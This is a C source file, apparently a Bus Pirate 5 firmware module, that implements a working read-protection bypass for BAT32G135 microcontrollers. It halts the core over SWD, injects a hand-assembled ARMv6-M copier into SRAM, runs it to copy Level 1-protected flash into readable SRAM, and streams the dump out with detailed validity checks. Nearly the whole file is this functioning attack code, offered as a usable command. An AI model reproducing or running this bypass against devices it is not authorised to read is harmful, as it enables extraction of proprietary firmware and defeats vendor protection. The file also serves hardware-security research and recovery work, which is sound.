/*
 * SPDX-License-Identifier: MIT
 * Copyright (c) 2026 Thaolia
 *
 * Written for the Bus Pirate 5 firmware (MIT, (c) 2023 Ian Lesnet, Where Labs
 * LLC). Independent reimplementation of a command surface -- no code was copied
 * from the project whose dialect it speaks; that project ships no licence. The
 * payload below was reassembled from its six ARMv6-M mnemonics, each encoded
 * from its format in the ARM ARM; the encodings were then checked against the
 * semantics the dialect documents in prose.
 */
/**
 * @file raiden_bat32.c
 * @brief Reading BAT32G135 flash through its own core, at protection Level 1.
 *
 * Why this works, and it rests on three measured premises rather than on a
 * datasheet clause:
 *   1. At Level 1 the SRAM stays fully readable -- the protection covers the
 *      flash and literally nothing else.
 *   2. The core stays haltable at Level 1.
 *   3. The core can read the flash: it executes from it. The protection hides
 *      the flash from the DEBUGGER's view, not from the CPU's.
 * So a copier placed in SRAM and run by the core moves flash into SRAM, and
 * SRAM is readable. The debugger never reads a flash address.
 *
 * WARNING that decides whether a buffer may be believed: at Level 1 the SRAM
 * this payload overwrites ALREADY holds flash-derived bytes -- the .data
 * section copied there at boot. A pass that silently failed would hand back
 * plausible, flash-shaped content that the payload never read. That is the one
 * failure here which LOOKS exactly like success, and it is why the PC is
 * checked against the trailing BKPT before a single word is emitted.
 */
#include <stdbool.h>
#include <stdint.h>
#include <string.h>

#include "pico/stdlib.h"
#include "pirate.h"
#include "command_struct.h"
#include "system_config.h"

#include "raiden_bat32.h"
#include "raiden_cmd.h"
#include "raiden_proto.h"
#include "raiden_swd.h"
#include "raiden_target.h"

/* --- Payload placement ----------------------------------------------- */

#define PAYLOAD_ADDR 0x20000000u        /* SRAM base: where the copier runs   */
#define PAYLOAD_BUF (PAYLOAD_ADDR + 0x20u) /* destination, above the copier   */
#define PAYLOAD_SP 0x20002000u          /* top of the 8 KB of SRAM            */
#define RAMREAD_MAX_WORDS 1024u         /* 4 KB per pass, the host's ceiling  */

/* The copier, reassembled instruction by instruction. r0 = source, r1 =
 * destination, r2 = word count:
 *
 *   0x00  6803  ldr  r3,[r0]
 *   0x02  600B  str  r3,[r1]
 *   0x04  3004  adds r0,#4
 *   0x06  3104  adds r1,#4
 *   0x08  3A01  subs r2,#1
 *   0x0A  D1F9  bne  -14      ; back to 0x00
 *   0x0C  BE00  bkpt #0
 *   0x0E  BE00  bkpt #0
 *
 * TWO breakpoints, not one: the halt may report the PC on either of them
 * depending on how the core retires the first, so the accepted window covers
 * both. The window is derived from the payload's LENGTH below rather than
 * written as 0x0C/0x0E, because a copier edited to be one instruction longer
 * would move the breakpoints while the literals stayed put -- and the check
 * would then reject every good pass, or worse, accept a bad one.
 */
static const uint32_t payload[] = {
    0x600B6803u,
    0x31043004u,
    0xD1F93A01u,
    0xBE00BE00u,
};

#define PAYLOAD_WORDS ((uint32_t)(sizeof(payload) / sizeof(payload[0])))
#define PAYLOAD_BYTES (PAYLOAD_WORDS * 4u)
#define PC_ACCEPT_LO (PAYLOAD_ADDR + PAYLOAD_BYTES - 4u)
#define PC_ACCEPT_HI (PAYLOAD_ADDR + PAYLOAD_BYTES - 2u)

/* The copier must not reach into its own destination. */
_Static_assert(PAYLOAD_ADDR + PAYLOAD_BYTES <= PAYLOAD_BUF,
               "the payload overlaps the buffer it copies into");

/* Halting a core that is executing application firmware, not one already
 * stopped: it can take several requests. */
#define HALT_MS 500u
/* 4 KB of word-at-a-time copy on a 32 MHz M0+ is microseconds. Half a second
 * is there to bound a payload that never terminates, not to wait for one. */
#define RUN_MS 500u
#define RUN_POLL_US 200u

/* One MEM-AP block, reused across the streaming readback: 64 bytes of .bss on
 * a part already at 87 % RAM. The dialect this speaks keeps a 4 KB buffer for
 * the same job; streaming needs none, because a line is four words and the
 * wire never has to hold the pass. */
static uint32_t blk[RAIDEN_MEM_BLOCK_WORDS];

static bool sram_notice_shown = false;

void raiden_bat32_init(void) {
    sram_notice_shown = false;
}

/* --- The pass -------------------------------------------------------- */

/** Run the copier. true means the buffer at PAYLOAD_BUF may be believed. */
static bool run_payload(uint32_t src, uint32_t words) {
    uint32_t check[PAYLOAD_WORDS];
    uint32_t dhcsr = 0;
    uint32_t xpsr = 0;
    uint32_t demcr_saved = 0;
    uint32_t demcr = 0;
    uint32_t pc = 0;
    uint32_t dfsr = 0;

    // MANDATORY first. At Level 1 a flash read answers ACK=FAULT, which
    // latches STICKYERR and fails EVERY later AP transaction. A caller that
    // probed the part before calling here has already poisoned the link, and
    // the halt below would fail for a reason that has nothing to do with
    // halting -- which is exactly how a Level 1 attempt was first misread.
    (void)raiden_swd_abort_clear();

    if (!raiden_swd_halt(HALT_MS, &dhcsr)) {
        rp_printf("[BAT32-RAM] core halt failed\r\n");
        return false;
    }
    if (!raiden_swd_mem_write(PAYLOAD_ADDR, payload, PAYLOAD_WORDS)) {
        rp_printf("[BAT32-RAM] SRAM not writable -- payload injection refused\r\n");
        return false;
    }

    // Read the copier back before running it. An SRAM that accepted the write
    // and kept something else would run whatever it kept, and the failure
    // would surface as "did not reach BKPT" -- pointing at the mechanism
    // rather than at the memory. All four words, not a sample: a sampled check
    // passes on exactly the corruption it did not sample.
    memset(check, 0, sizeof(check));
    if (!raiden_swd_mem_read_block(PAYLOAD_ADDR, check, PAYLOAD_WORDS)) {
        rp_printf("[BAT32-RAM] payload readback mismatch (%08X %08X)\r\n",
                  0u, 0u);
        return false;
    }
    for (uint32_t i = 0; i < PAYLOAD_WORDS; i++) {
        if (check[i] != payload[i]) {
            // (expected, got) of the FIRST word that differs.
            rp_printf("[BAT32-RAM] payload readback mismatch (%08X %08X)\r\n",
                      (unsigned)payload[i], (unsigned)check[i]);
            return false;
        }
    }

    if (!raiden_swd_core_reg_write(RAIDEN_REG_SP, PAYLOAD_SP) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R0, src) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R1, PAYLOAD_BUF) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_R2, words) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_PC, PAYLOAD_ADDR | 1u)) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    // The T bit of xPSR. ARMv6-M has no ARM state at all, so a clear T bit is
    // not a mode choice -- it is a HardFault on the very first instruction,
    // which would surface as "did not reach BKPT" and read like the bypass not
    // working on this part. Both return values are checked, deliberately: the
    // dialect this speaks throws them away, and a silent failure here is
    // indistinguishable from a silicon that refuses to execute from SRAM.
    if (!raiden_swd_core_reg_read(RAIDEN_REG_XPSR, &xpsr) ||
        !raiden_swd_core_reg_write(RAIDEN_REG_XPSR, xpsr | (1u << 24))) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    // Vector catch on HardFault. Without it, "this core will not execute from
    // SRAM" and "the copier looped forever" produce the SAME half-second
    // timeout and cannot be told apart. With it the core stops at once and the
    // PC says where it broke.
    (void)raiden_swd_mem_read_block(RAIDEN_CM_DEMCR, &demcr_saved, 1u);
    demcr = RAIDEN_DEMCR_TRCENA | RAIDEN_DEMCR_VC_HARDERR;
    if (!raiden_swd_mem_write(RAIDEN_CM_DEMCR, &demcr, 1u)) {
        rp_printf("[BAT32-RAM] core register write failed\r\n");
        return false;
    }

    if (!raiden_swd_resume()) {
        rp_printf("[BAT32-RAM] resume failed\r\n");
        return false;
    }

    bool halted = false;
    absolute_time_t deadline = make_timeout_time_ms(RUN_MS);
    for (;;) {
        if (!raiden_swd_read_dhcsr(&dhcsr)) {
            dhcsr = 0;
            break;
        }
        if ((dhcsr & RAIDEN_DHCSR_S_LOCKUP) != 0u) {
            break;
        }
        if ((dhcsr & RAIDEN_DHCSR_S_HALT) != 0u) {
            halted = true;
            break;
        }
        if (time_reached(deadline)) {
            break;
        }
        busy_wait_us_32(RUN_POLL_US);
    }

    // Best effort, and never a reason to fail a pass whose data is already
    // good: leaving vector catch armed would change how the target behaves the
    // next time anything resumes it, with nothing on the wire to say so.
    if (demcr_saved != demcr) {
        (void)raiden_swd_mem_write(RAIDEN_CM_DEMCR, &demcr_saved, 1u);
    }

    if (!halted) {
        rp_printf("[BAT32-RAM] payload did not reach BKPT (%s, DHCSR=0x%08X)\r\n",
                  ((dhcsr & RAIDEN_DHCSR_S_LOCKUP) != 0u) ? "core LOCKED UP"
                                                          : "core still running",
                  (unsigned)dhcsr);
        (void)raiden_swd_halt(HALT_MS, NULL); // leave it stopped, not running
        return false;
    }

    if (!raiden_swd_core_reg_read(RAIDEN_REG_PC, &pc)) {
        rp_printf("[BAT32-RAM] PC unreadable after halt -- refusing the buffer\r\n");
        return false;
    }
    if (pc < PC_ACCEPT_LO || pc > PC_ACCEPT_HI) {
        // THE check. A buffer nobody vouches for is the only failure that
        // looks like a success: at Level 1 that SRAM plausibly holds the
        // .data copied from flash at boot, i.e. flash-derived bytes this
        // payload never read. Undetectable from the host side.
        (void)raiden_swd_mem_read_block(RAIDEN_CM_DFSR, &dfsr, 1u);
        rp_printf("[BAT32-RAM] halted at PC=0x%08X, not the trailing BKPT "
                  "(DFSR=0x%08X) -- buffer would not be flash data\r\n",
                  (unsigned)pc, (unsigned)dfsr);
        return false;
    }
    return true;
}

/* --- Command --------------------------------------------------------- */

static void cmd_ramread(int argc, char* argv[]) {
    uint32_t src = 0;
    uint32_t words = 4u; // the dialect's default

    if (argc < 4 || !raiden_parse_hex32(argv[3], &src)) {
        rp_err("Usage: SWD BAT32 RAMREAD <addr> [words]");
        return;
    }
    // Base 0 for the count, base 16 for the address: the split is the
    // dialect's, and it is asymmetric on purpose. A count read as hex would
    // turn RAMREAD 0x0 10 into sixteen words without failing.
    if (argc >= 5 && !raiden_parse_u32(argv[4], &words)) {
        rp_err("Invalid word count");
        return;
    }
    if (words < 1u || words > RAMREAD_MAX_WORDS) {
        rp_err("words must be 1-%u (4 KB max per pass)", (unsigned)RAMREAD_MAX_WORDS);
        return;
    }
    if ((src & 3u) != 0u) {
        // Checked here AND nowhere else it could be reached from: ldr r3,[r0]
        // faults on an unaligned address, and the symptom would come back as
        // "payload did not reach BKPT" -- i.e. as "the bypass does not work"
        // when the only thing wrong is the argument.
        rp_err("address 0x%08X must be word-aligned", (unsigned)src);
        return;
    }
    if (!raiden_swd_ensure_connected()) {
        return; // ensure_connected() has already said why
    }

    if (!sram_notice_shown) {
        sram_notice_shown = true;
        rp_printf("[BAT32-RAM] NOTE: this overwrites target SRAM 0x%08X-0x%08X, "
                  "where the .data copied from flash at boot lives. A reset "
                  "restores about 93 %% of it.\r\n",
                  (unsigned)PAYLOAD_ADDR, (unsigned)(PAYLOAD_BUF + 4u * RAMREAD_MAX_WORDS - 1u));
    }

    if (!run_payload(src, words)) {
        rp_err("RAMREAD failed (see log for which step)");
        return;
    }

    // Stream the target buffer back. Never accumulated: 1024 words is 256
    // lines, roughly 12.8 KB, against a 1 KB TX FIFO that DROPS rather than
    // blocks. Emitting a block at a time puts one block of bit-banging between
    // bursts, which is what drains the FIFO -- the same rhythm SWD READ uses.
    uint32_t done = 0;
    while (done < words) {
        uint32_t at = PAYLOAD_BUF + done * 4u;
        uint32_t n = raiden_swd_block_words(at, words - done);
        if (!raiden_swd_mem_read_block(at, blk, n)) {
            (void)raiden_swd_abort_clear();
            if (!raiden_swd_mem_read_block(at, blk, n)) {
                rp_printf("[BAT32-RAM] readback of the target buffer failed at "
                          "0x%08X\r\n", (unsigned)at);
                rp_err("RAMREAD failed (see log for which step)");
                return;
            }
        }
        // Lines are labelled with the SOURCE address, never with where the
        // copy landed. The host keys every word on its line's own prefix and
        // returns nothing at all if one requested address is missing -- a line
        // labelled 0x20000020 for flash word 0 would lose the entire pass.
        for (uint32_t i = 0; i < n; i += 4u) {
            uint32_t k = ((n - i) > 4u) ? 4u : (n - i);
            rp_words_line(src + (done + i) * 4u, &blk[i], k);
        }
        done += n;
    }
    // LAST, after every data line. The host stops reading a reply on its first
    // marker; a trailer emitted per block, as the hexdump path does, would
    // leave the parser racing a drain loop for the rest of the pass.
    rp_ok("%u words read via core payload", (unsigned)words);
}

static void cmd_help(void) {
    rp_send("SWD BAT32 RAMREAD <addr> [words] - read flash VIA the core (L1 bypass)\r\n");
    rp_send("  RAMREAD is read-only on FLASH but OVERWRITES target SRAM "
            "0x20000000-0x2000101F\r\n");
    rp_send("  The destructive verbs of this dialect -- PROGRAM, WRITE, PATTERN,\r\n");
    rp_send("  SECTORERASE, CHIPERASE, ARM, DISARM -- are DELIBERATELY not\r\n");
    rp_send("  implemented here. Arming or recovering a Level 1 needs the raiden.\r\n");
}

void raiden_bat32_command(int argc, char* argv[]) {
    if (raiden_target_family() != RAIDEN_TARGET_BAT32) {
        // Checked before anything else, as the dialect does. Injecting a
        // Cortex-M0+ copier into an nRF52's SRAM would not read its flash; it
        // would overwrite memory on a part nobody asked about.
        rp_err("SWD BAT32 requires TARGET BAT32 first");
        return;
    }
    if (argc < 3) {
        cmd_help();
        return;
    }
    if (strcmp(argv[2], "RAMREAD") == 0) {
        cmd_ramread(argc, argv);
        return;
    }
    rp_err("Unknown SWD BAT32 operation '%s' (this binmode implements RAMREAD "
           "only; the destructive verbs are deliberately absent)", argv[2]);
}
